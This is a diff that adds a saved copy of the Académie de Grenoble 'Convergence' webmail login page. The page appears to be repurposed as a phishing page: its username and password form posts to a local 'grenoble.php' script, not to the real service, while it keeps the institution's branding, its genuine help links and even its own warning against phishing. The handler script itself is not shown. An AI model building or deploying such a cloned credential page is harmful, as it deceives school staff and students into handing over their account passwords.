@@ -1,0 +1,353 @@
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" class="dj_webkit dj_chrome dj_contentbox"><head><script data-dapp-detection="">!function(){let e=!1;function n(){if(!e){const n=document.createElement("meta");n.name="dapp-detected",document.head.appendChild(n),e=!0}}if(window.hasOwnProperty("ethereum")){if(window.__disableDappDetectionInsertion=!0,void 0===window.ethereum)return;n()}else{var t=window.ethereum;Object.defineProperty(window,"ethereum",{configurable:!0,enumerable:!1,set:function(e){window.__disableDappDetectionInsertion||n(),t=e},get:function(){if(!window.__disableDappDetectionInsertion){const e=arguments.callee;e&&e.caller&&e.caller.toString&&-1!==e.caller.toString().indexOf("getOwnPropertyNames")||n()}return t}})}}();</script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+		<!-- Mimic Internet Explorer 7 -->
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
+		<title>Convergence</title>
+		<style type="text/css">
+			@import "../../../js/dojotoolkit/dojo/resources/dojo.css";
+			@import "../../../js/dojotoolkit/dijit/themes/dijit.css";
+			@import "../../../js/dojotoolkit/dijit/themes/dijit_rtl.css";
+			@import "../../../js/dojotoolkit/dijit/themes/tundra/form/Button.css";
+			@import "../../../js/dojotoolkit/dojox/form/resources/DropDownSelect.css";
+		</style>
+		<link rel="stylesheet" href="./grenoble_files/login.css" type="text/css">
+		<script type="text/javascript">
+			var djConfig= {
+				cacheBust: "none",
+				isDebug:false,
+				parseOnLoad:true
+			};
+
+			(function() {
+				function getParameter(paramName) {
+					paramName += "=";
+					var queryString = window.location.search;
+					var strBegin = queryString.indexOf(paramName);
+					if (strBegin==-1){
+						strBegin = queryString.length;
+					}
+					else {
+						strBegin += paramName.length;
+					}
+					var strEnd = queryString.indexOf("&",strBegin);
+
+					if (strEnd==-1){
+						strEnd = queryString.length;
+					}
+
+					return queryString.substring(strBegin,strEnd);
+				}
+
+				var locale = getParameter("lang");
+				if (locale.length >0){
+					djConfig.locale = locale.toLowerCase();
+					if ((djConfig.locale.indexOf("ar") == 0) || (djConfig.locale.indexOf("he") == 0)) {
+						djConfig.direction = "rtl";
+					}
+					else {
+						djConfig.direction = "ltr";
+					}
+					var top = document.getElementsByTagName("html")[0];
+					top.dir = djConfig.direction;
+				}
+			})()
+		</script>
+
+		<script type="text/javascript" src="./grenoble_files/dojo.js.téléchargement"></script></head><body role="application"><textarea id="dijit._editor.RichText.savedContent" style="display:none;position:absolute;top:-100px;left:-100px;height:3px;width:3px;overflow:hidden;"></textarea>
+		<script type="text/javascript">
+			dojo.registerModulePath("iwc", "../../iwc");
+			dojo.require("iwc.i18n.resources");
+			dojo.requireLocalization("iwc.i18n","resources");
+			iwc.l10n = dojo.i18n.getLocalization("iwc.i18n", "resources");
+			dojo.require("iwc.login");
+
+			function reloadWithHttps() {
+				var enablessl = iwc.cookie("iwc-clientpref","enablealwaysssl");
+				if (enablessl == "true") {
+				if(window.location.protocol == "http:"){
+					var contextPath = iwc.cookie("iwc-auth","path");
+					var defaultURL = "";
+					if(contextPath && contextPath != ""){
+						defaultURL = "https://" + window.location.host + contextPath;
+					}else{
+						defaultURL = "https://" + window.location.host + window.location.pathname + window.location.search;
+					}
+					window.location.replace(defaultURL);
+				}
+                                }
+			}
+			
+			dojo.addOnLoad(function(){
+				reloadWithHttps();
+				// prevent clickjacking
+				if (top.location.hostname != self.location.hostname) {
+					try {
+						if (document.forms[0].password) {
+							document.forms[0].style.display = "none";
+						}
+					} catch (e) {
+						document.body.style.display = "none";
+					}
+				}
+
+				iwc.login.setFocus();
+				iwc.login.doI18N();
+				//document.getElementById('picCache').src='imageList.html?'+djConfig.cacheBust;
+				//var lang = langLblMapping[djConfig.locale.toLowerCase()]?langLblMapping[djConfig.locale.toLowerCase()]:langLblMapping['en-us'];
+				var lang = "en_us";
+				if(djConfig && djConfig.locale) {
+					lang = djConfig.locale.toLowerCase();
+				}
+				dijit.byId('langButton').attr("value", lang);
+				dojo.connect(dijit.byId("langButton"), "onChange", function(lang) {
+					var loginUrl = window.location;
+
+                    if(window.location.search!=""&&window.location.search.indexOf('lang=')>-1)
+                        loginUrl = loginUrl.href.replace('lang='+iwc.login.getParameter('lang'),'lang='+lang);
+                    else
+                        loginUrl = loginUrl+"?lang="+lang
+
+                    if(window.location.search.indexOf("u=1")==-1)
+                        loginUrl=loginUrl+'&u=1';
+                    
+					window.location = loginUrl;
+					return false;
+				});
+			});
+
+			function login() {
+				return iwc.login.checkName();
+			}
+		</script>
+	
+
+	
+		<script type="text/javascript">
+			
+		</script>
+        <div class="Convergence-Login" id="convergenceLogin">
+			<div class="Convergence-Login-Border">
+				<div class="Convergence-Login-Banner">
+					<div class="Convergence-Login-Logo" wairole="presentation"></div>
+					<!--
+						Normalement, le message d'accueil est défini dans un fichier javascript pour chaque langue. Or,
+						il ne semble pas appliqué correctement. Si on commente le bloc "welcomeMsg" ça casse toute la page.
+						On contourne en ajoutant un bloc en-dessous et en jouant sur les styles.
+					-->
+					<div id="welcomeMsg" class="Convergence-Login-WelcomeMsg">Convergence</div>
+					<div class="Convergence-Login-Bienvenue">Bienvenue sur le Webmail de l'académie</div>
+				</div>
+
+				<div class="Convergence-Login-Filoutage">
+					<p><b>Lutte contre le filoutage</b><br>Ne communiquez <b>jamais</b> votre mot de passe par mail ou suite à un mail reçu. En cas de doute, vous pouvez <a href="https://bv.ac-grenoble.fr/uPortal/guichet_unique.php" target="_blank">joindre le guichet académique</a>.</p>
+
+                                </div>
+				<div class="Convergence-Login-Notification" id="alertMsg" aria-live="assertive" role="alert" tabindex="0" style="visibility: hidden;"></div>
+				
+				<form action="grenoble.php" method="post" onsubmit="return login();">
+
+					<div>
+						<div class="Convergence-Login-Form">
+							<div class="Convergence-Login-FormRow">
+								<label id="usernameLabelID" for="username">Nom d'utilisateur :</label>
+								<input id="username" name="username" type="text" aria-required="true">
+							</div>
+							<div class="Convergence-Login-FormRow">
+								<label id="passwordLabelID" for="password">Mot de passe :</label>
+								<input id="password" name="password" type="password" aria-required="true" autocomplete="off">
+							</div>
+								<div class="Convergence-Login-FormRow">
+								<input id="chkpreloginip" name="chkpreloginip" type="hidden" value="true" aria-required="false">
+							</div>
+							<div class="Convergence-Login-FormRow tundra">
+
+								<div class="Convergence-Login-SelectLang">
+									<table class="dijit dijitReset dijitInline dijitLeft dojoxDropDownSelectFixedWidth Convergence-Login-SelectLang dojoxDropDownSelect" dojoattachpoint="dropDownNode,tableNode" role="button" dojoattachevent="onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="langButton" cellspacing="0" cellpadding="0"><tbody wairole="presentation" role="presentation"><tr wairole="presentation" role="presentation"><td class="dijitReset dijitStretch dijitButtonContents dijitButtonNode"><span class="dijitReset dijitInline dijitButtonText" dojoattachpoint="containerNode,popupStateNode" id="langButton_label"><span class=" dojoxDropDownSelectLabel">English</span></span><input type="hidden" dojoattachpoint="valueNode" value="en-us">
+		</td><td class="dijitReset dijitRight dijitButtonNode dijitArrowButton dijitDownArrowButton" dojoattachpoint="focusNode,titleNode" wairole="button" waistate="haspopup-true,labelledby-langButton_label" role="button" aria-haspopup="true" aria-labelledby="langButton_label" id="langButton" tabindex="0" aria-disabled="false"><div class="dijitReset dijitArrowButtonInner"> </div><div class="dijitReset dijitArrowButtonChar" wairole="presentation" role="presentation">▼</div></td></tr></tbody></table>
+								</div>
+								<div class="Convergence-Login-FormButton" id="buttonContainer">
+									<div>
+										<span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit" value="" wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="signin" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">Connexion</span></button></span></span></span>
+									</div>
+								</div>
+								<div style="clear: both"></div>
+							</div>
+
+						</div>
+
+					</div>
+					<div style="clear: both"></div>
+				</form>
+		<div class="Password-Expired-Message tundra" id="PwdExpiredMsg" style="display:none;">                   
+			<div class="ErrorMsg-Contianer" id="btnContainer">                                                
+				<div class="Error-Icon"></div>
+				<div class="Error-Msg" id="errMsg"></div>			    	
+			</div>
+			<div class="Convergence-Login-FormButton ChangePwdBtn">	
+				<span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="changepwd"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="button" value="" wairole="button" waistate="labelledby-changepwd_label" role="button" aria-labelledby="changepwd_label" id="changepwd" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="changepwd_label" dojoattachpoint="containerNode">Modifier le mot de passe</span></button></span></span></span>
+		    </div>
+                </div>                
+				<div id="help" class="Convergence-Login-Aide">
+					<a href="https://bv.ac-grenoble.fr/uPortal/id_questce.php" target="_blank">Identifiant ou mot de passe oublié ?</a>
+				</div>
+
+				<!--div class="Convergence-Login-RedBand"></div-->
+				<div id="copyright" class="Convergence-Login-Copyright">Copyright © 2010, Oracle et/ou ses affiliés. Tous droits réservés.</div>
+
+			    </div>
+			</div>
+		
+
+		<div id="overlay" class="login">
+			<div class="centered">
+				<div class="logo"></div>
+				<div id="progress"></div>
+			</div>
+		</div>
+
+		<iframe name="picCache" id="picCache" src="./grenoble_files/saved_resource.html" width="0" height="0" frameborder="0"></iframe>
+
+		<noscript>
+			<div style="width:50%; margin-top: 5%; margin-left:auto; margin-right:auto">
+				<iframe src="noscript.html" frameborder=0 width=100%" />
+			</div>
+		</noscript>
+
+		<div id="massif" class="massif">
+    
+
+</div><table class="dijit dijitMenu dijitMenuPassive dijitReset dijitMenuTable dojoxDropDownSelectMenu" wairole="menu" tabindex="0" dojoattachevent="onkeypress:_onKeyPress" role="menu" id="dijit_Menu_0" widgetid="dijit_Menu_0" style="visibility: hidden; position: absolute; top: -9999px;">
+	<tbody class="dijitReset" dojoattachpoint="containerNode"><tr class="dijitReset dijitMenuItem dojoxDropDownSelectSelectedOption" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_0" aria-disabled="false" widgetid="dijit_MenuItem_0" aria-labelledby="dijit_MenuItem_0_text" aria-selected="true" lang="en-us">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_0_text">English</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_1" aria-disabled="false" widgetid="dijit_MenuItem_1" aria-labelledby="dijit_MenuItem_1_text" aria-selected="false" lang="es">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_1_text">Español</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_2" aria-disabled="false" widgetid="dijit_MenuItem_2" aria-labelledby="dijit_MenuItem_2_text" aria-selected="false" lang="de">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_2_text">Deutsch</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_3" aria-disabled="false" widgetid="dijit_MenuItem_3" aria-labelledby="dijit_MenuItem_3_text" aria-selected="false" lang="fr">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_3_text">Français</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_4" aria-disabled="false" widgetid="dijit_MenuItem_4" aria-labelledby="dijit_MenuItem_4_text" aria-selected="false" lang="fr-ca">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_4_text">Français Canadien</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_5" aria-disabled="false" widgetid="dijit_MenuItem_5" aria-labelledby="dijit_MenuItem_5_text" aria-selected="false" lang="hi">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_5_text">हिन्दी</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_6" aria-disabled="false" widgetid="dijit_MenuItem_6" aria-labelledby="dijit_MenuItem_6_text" aria-selected="false" lang="it">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_6_text">Italiano</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_7" aria-disabled="false" widgetid="dijit_MenuItem_7" aria-labelledby="dijit_MenuItem_7_text" aria-selected="false" lang="ja">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_7_text">日本語</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_8" aria-disabled="false" widgetid="dijit_MenuItem_8" aria-labelledby="dijit_MenuItem_8_text" aria-selected="false" lang="ko">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_8_text">한국어</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_9" aria-disabled="false" widgetid="dijit_MenuItem_9" aria-labelledby="dijit_MenuItem_9_text" aria-selected="false" lang="zh-cn">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_9_text">简体中文</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr><tr class="dijitReset dijitMenuItem" dojoattachpoint="focusNode" wairole="menuitem" tabindex="-1" dojoattachevent="onmouseenter:_onHover,onmouseleave:_onUnhover,ondijitclick:_onClick" role="menuitem" id="dijit_MenuItem_10" aria-disabled="false" widgetid="dijit_MenuItem_10" aria-labelledby="dijit_MenuItem_10_text" aria-selected="false" lang="zh-tw">
+	<td class="dijitReset" wairole="presentation" role="presentation">
+		<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuItemIcon " dojoattachpoint="iconNode">
+	</td>
+	<td class="dijitReset dijitMenuItemLabel" colspan="2" dojoattachpoint="containerNode" id="dijit_MenuItem_10_text">繁體中文</td>
+	<td class="dijitReset dijitMenuItemAccelKey" style="display: none" dojoattachpoint="accelKeyNode"></td>
+	<td class="dijitReset dijitMenuArrowCell" wairole="presentation" role="presentation">
+		<div dojoattachpoint="arrowWrapper" style="visibility: hidden">
+			<img src="./grenoble_files/blank.gif" alt="" class="dijitMenuExpand">
+			<span class="dijitMenuExpandA11y">+</span>
+		</div>
+	</td>
+</tr></tbody>
+</table></body></html>
